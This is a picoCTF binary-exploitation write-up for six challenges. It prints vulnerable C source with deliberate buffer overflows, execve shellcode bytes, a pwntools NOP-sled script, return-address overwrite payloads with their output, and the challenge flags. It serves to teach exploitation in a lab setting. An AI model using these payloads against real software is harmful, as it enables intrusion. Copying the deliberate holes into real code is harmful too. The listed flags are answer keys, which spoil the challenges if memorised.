# Binary Exploit

### handy-shellcode (50 points)

This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in `/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5` on the shell server.

FLAG: `picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Find a shellcode to execute `/bin/bash` online:

```
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
```

Use python2 to print it and pipe it to the vulnerable program. python3 has a different version of print statement, which removes some "unprintable" characters from the output. That would ruin the shellcode.

**Note:** We can use `cat` to keep the input stream open!

```bash
$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
```

We get the following result:

```bash
$ /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
Enter your shellcode:
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀
Thanks! Executing now...
id
uid=29614(sophiasp1r0) gid=8870(handy-shellcode_1) groups=8870(handy-shellcode_1),1002(competitors),29615(sophiasp1r0)
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}exit

```

Same effect can be achieve using the following command:

```bash
$ (echo -n -e '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ; cat) | ./vuln
```

or use `pwn.asm(pwn.shellcraft.linux.sh())` (See [this link](https://www.youtube.com/watch?v=Nn0fUJuQEsk&t=174s))

### practice-run-1 (50 points)

You're going to need to know how to run programs if you're going to get out of here. Navigate to `/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e` on the shell server and run this program to receive a flag.

FLAG: `picoCTF{g3t_r3adY_2_r3v3r53}`

```bash
$ /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this
# => picoCTF{g3t_r3adY_2_r3v3r53}
```

### Overflow 0 (100 points)

This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in `/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6` on the shell server.

FLAG: `picoCTF{3asY_P3a5y4a888b8e}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}

```

Overflow the buffer to trigger segmentation fault, and the program will print out the flag.

```bash
$ python -c "print('A' * 140)" | xargs ./vuln
# => picoCTF{3asY_P3a5y4a888b8e}
```

### Overflow 1 (150 points)

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in `/problems/overflow-1_1_e792baa0d29d24699530e6a26071a260` on the shell server.

FLAG: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

Using gdb we can figure out that the buffer starts at `0xffffd6c0` and ends at `0xffffd700`. However, `ebp` for `vuln` is `0xffffd708`. That means, there are 8 bytes between the end of the buffer and the start of the saved frame pointer. The return address should be at `0xffffd70c`.

That means, we need to pass in a string of 72 bytes to overwrite the return address and make `vuln` return to `flag`. The address of `flag` is `0x080485e6`.

Therefore, we can use the following command:

```bash
$ ruby -e 'print("A" * 76 + "\xe6\x85\x04\x08");' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)
```

### slippery-shellcode (200 points)

This program is a little bit more tricky. Can you spawn a shell and use that to read the `flag.txt`? You can find the program in `/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8` on the shell server. Source.

FLAG: `picoCTF{sl1pp3ry_sh311c0d3_de21cb07}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```

The idea is just to add `NOP`s at the beginning of the buffer to make the execution slip down to the shellcode. Based on the random value generated, we have to make sure that the shellcode is located at least 256 bytes away from the beginning of the buffer.

Therefore, we can create the following script to get the flag.

```python
#!/usr/bin/env python2
  
from pwn import *

p = process('/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/vuln')

p.recv()

payload = '\x90' * 300 + asm(shellcraft.i386.linux.sh());

p.sendline(payload)

p.interactive()
```

Once we will get a shell prompt, we can use the following commands to get the flag:

```bash
[*] Switching to interactive mode
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89�h\x814$ri1�Qj\x04Y�Q��1�j\x0bX̀
Thanks! Executing from a random location now...
$ pwd
/home/sophiasp1r0
$ cd /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8
$ ls
flag.txt  vuln    vuln.c
$ cat flag.txt
picoCTF{sl1pp3ry_sh311c0d3_de21cb07}
```

### OverFlow 2 (250 points)

Now try overwriting arguments. Can you get the flag from this program? You can find it in `/problems/overflow-2_1_210f23786438d7f7e527f4901367a74b` on the shell server. Source.

FLAG: `picoCTF{arg5_and_r3turn5001d1db0}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

Overwrite the return address of `vuln` to be the address of `flag` using the buffer overflow. Remember that once the program jumps to `flag`, it would assume `esp` is pointing to its return address. Hence, we have to add 4 bytes of junk data after the return address of `vuln` and then put two 4-byte argument after that.

Using gdb, we can know that the address of `flag` is `0x080485e6`, the address of the buffer in `vuln` is `0xffb1f740`, the return address is at `9xffb1f7fc`. Hence, we have to create a payload of `188 (0xffb1f7fc - 0xffb1f740) + 4 (address of flag) + 4 (junk data that flag regards as its return address) + 2 * 4 (arguments) = 204` bytes. Having that in mind, we can use the following command:

```bash
$ python -c 'print("A" * 188 + "\xe6\x85\x04\x08" + "A" * 4 + "\xEF\xBE\xAD\xDE" + "\x0D\xD0\xDE\xC0")' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn5001d1db0}Segmentation fault (core dumped)
```
